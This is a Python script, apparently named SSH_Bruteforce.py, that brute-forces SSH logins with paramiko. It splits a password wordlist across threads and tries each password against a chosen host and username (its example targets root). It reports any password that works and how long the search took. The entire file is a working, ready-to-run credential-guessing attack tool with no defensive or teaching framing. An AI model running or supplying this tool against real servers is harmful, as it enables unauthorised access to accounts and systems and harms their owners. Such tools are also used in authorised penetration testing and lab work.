from threading import Thread
# from multiprocessing import Process
import argparse,sys,queue,linecache,time

import paramiko


class BruteForce:
    def __init__(self, host, user, filename,thread_num,q):
        self.host = host
        self.user = user
        self.filename = filename
        self.thread_num = thread_num
        self.q = q

    def run_thread(self):
        self.filelines = self.get_filelines(self.filename)
        self.one_lines = int(self.filelines/self.thread_num)
        self.remain_lines = self.filelines - self.one_lines*self.thread_num
        self.thread_list = []
        self.numberlines = 1
        filename_t = self.filename
        for i in range(self.thread_num):
            if i == self.thread_num-1:
                lines = self.one_lines + self.remain_lines
            else:
                lines = self.one_lines
            host_t = self.host
            user_t = self.user
            thread = Thread(target=self.bruteforce, args=(filename_t,self.numberlines,self.numberlines+lines,host_t,user_t,self.q),daemon=True)
            # thread = Process(target=self.bruteforce, args=(filename_t,self.numberlines,self.numberlines+lines,host_t,user_t,self.q),daemon=True)
            self.numberlines += lines
            thread.start()
            self.thread_list.append(thread)
        return self.thread_list

    def bruteforce(self,filename_t,numberlines,lines,host_t,user_t,q):
        policy_t = paramiko.AutoAddPolicy()
        for i in range(numberlines,lines):
            line = linecache.getline(filename_t, i).strip()
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(policy_t)
                client.connect(host_t, username=user_t, password=line,banner_timeout=84600,timeout=84600,auth_timeout=84600)
                q.put(line)   
                print(f'[+] {line} is correct')
                client.close()
                break
            except:
                print(f'[-] {line} is not correct')
            finally:
                client.close()
        linecache.clearcache()

    def get_filelines(self,filename):
        lens = len(linecache.getlines(self.filename))
        linecache.clearcache()
        return lens

def get_time(start_time,end_time):
    spend = end_time - start_time
    if spend <= 60:
        spend = str(round(spend,2)) + ' s'
    elif spend > 60 and spend <= 3600:
        spend = str(round(spend/60,2)) + ' minutes'
    elif spend > 3600 and spend <= 86400:
        spend = str(round(spend/3600,2)) + ' hours'
    elif spend > 86400:
        spend = str(round(spend/86400,2)) + ' days'
    return spend

if __name__ == '__main__':
    help_text = '''exmple: python3 SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10'''
    parser = argparse.ArgumentParser(description=help_text)
    parser.add_argument('-H', '--host',type=str, help='Hostname/IP', required=True)
    parser.add_argument('-u', '--user', type=str,help='Username', required=True)
    parser.add_argument('-f', '--file', type=str,help='Password file', required=True)
    parser.add_argument('-t', '--thread', type=int,help='Thread number', required=True)
    args = parser.parse_args()
    host = args.host
    user = args.user
    filename = args.file
    thread_num = int(args.thread)
    q = queue.Queue()
    bf = BruteForce(host, user, filename, thread_num,q)
    start_time = time.time()
    thread_list = bf.run_thread()
    thread_join = 0
    while True:
        if not q.empty():
            sys.exit(f'SSH PassWord：{q.get()}\nTime: {get_time(start_time,time.time())}')
        
        for i in thread_list:
            if not i.is_alive():
                thread_join += 1
                if thread_join == thread_num:
                    sys.exit(f'[!] Brute force finished\n[!] SSH password not found\nTime: {get_time(start_time,time.time())}')
            else:
                break
        thread_join = 0
        